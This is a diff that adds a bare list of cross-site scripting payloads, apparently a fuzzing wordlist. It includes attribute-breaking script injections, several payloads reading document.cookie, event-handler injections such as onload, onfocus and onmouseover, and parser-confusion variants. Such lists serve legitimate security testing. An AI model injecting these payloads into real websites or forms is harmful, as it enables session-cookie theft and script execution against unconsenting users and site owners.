@@ -1,0 +1,17 @@
+"><script>alert("XSS")</script>
+<<script>alert("XSS");//<</script>
+<script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+<h1><font color=blue>hellox worldss</h1>
+<BODY ONLOAD=alert('hellox worldss')>
+<input onfocus=write(XSS) autofocus>
+<BODY ONLOAD=alert('hellox worldss')>
+<input onfocus=write(XSS) autofocus>
+<input onblur=write(XSS) autofocus><input autofocus>
+<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<? foo="><script>alert(1)</script>">
+<! foo="><script>alert(1)</script>">
+</ foo="><script>alert(1)</script>">
+<script src="#">{alert(1)}</script>;1
+<b onmouseover=alert('Wufff!')>click me!</b>
